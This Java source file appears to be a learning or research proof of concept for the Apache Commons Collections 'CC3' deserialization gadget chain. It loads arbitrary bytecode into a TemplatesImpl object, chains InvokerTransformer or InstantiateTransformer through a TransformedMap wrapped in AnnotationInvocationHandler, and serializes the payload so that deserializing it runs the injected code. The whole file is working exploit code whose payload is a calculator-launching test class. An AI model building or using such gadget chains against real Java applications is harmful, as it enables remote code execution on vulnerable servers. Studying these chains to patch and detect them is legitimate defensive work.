package exp;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

import static tools.Decode.unserializeBase64Decode;
import static tools.Encode.serializeBase64Encode;
import static tools.SetField.setField;

public class CC3 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_name","CC3");
        byte[] code = Files.readAllBytes(Paths.get("src/main/java/classpoc/Calc.class"));
        byte[][] codes = {code};
        setField(templates, "_bytecodes",codes);
        setField(templates, "_tfactory",new TransformerFactoryImpl());

/// ==========================================方式一==========================================
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",null,null)
        };
/// ==========================================方式一==========================================

/// ==========================================方式二==========================================
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(TrAXFilter.class),
//                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
//        };
/// ==========================================方式二==========================================

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","value");
        Map decorator = TransformedMap.decorate(map,null,chainedTransformer);
        Class annotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object annotationInvocationHandler = annotationInvocationHandlerConstructor.newInstance(Target.class,decorator);
        serializeBase64Encode(annotationInvocationHandler);
        unserializeBase64Decode("ser.bin");
    }
}

